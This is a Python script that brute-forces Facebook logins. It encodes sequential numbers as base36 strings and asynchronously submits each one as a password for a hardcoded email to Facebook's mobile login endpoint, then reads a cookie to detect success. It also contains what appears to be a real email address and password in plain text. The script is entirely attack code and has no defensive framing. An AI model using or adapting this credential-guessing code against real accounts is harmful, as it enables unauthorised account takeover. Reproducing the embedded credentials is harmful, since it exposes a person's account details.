import math, time, requests, asyncio

EMAIL = "mickreys249@gmail.com"
PASSWORD = "karelmatthieu15"

loop = asyncio.get_event_loop()

fpass = None

def base36encode(number, alphabet="0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"):
  if not isinstance(number, int): raise TypeError("number must be an integer")
  base36 = ""
  sign = ""
  if number < 0:
    sign = "-"
    number = -number
  if 0 <= number < len(alphabet):
    return sign + alphabet[number]
  while number != 0:
    number, i = divmod(number, len(alphabet))
    base36 = alphabet[i] + base36
  return sign + base36

async def login(email: str, password: str):
  session = requests.session()
  response = session.post("https://m.facebook.com/login.php", data={"email": email,"pass": password}, allow_redirects=False)
  cookies = response.cookies
  print(response.headers)
  global fpass
  fpass = password if not "sfau" in cookies else None
  return not "sfau" in cookies
if __name__ == "__main__":
  strings = ("0","1","2","3","4","5","6","7","8","9","a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z")
  tasks = []
  for iteration in range(0, int(1)):
    print(iteration)
    pwd = base36encode(iteration, "".join(strings))
    tasks.append(loop.create_task(login(EMAIL, pwd)))
  loop.run_until_complete(asyncio.gather(*tasks))
  print(fpass)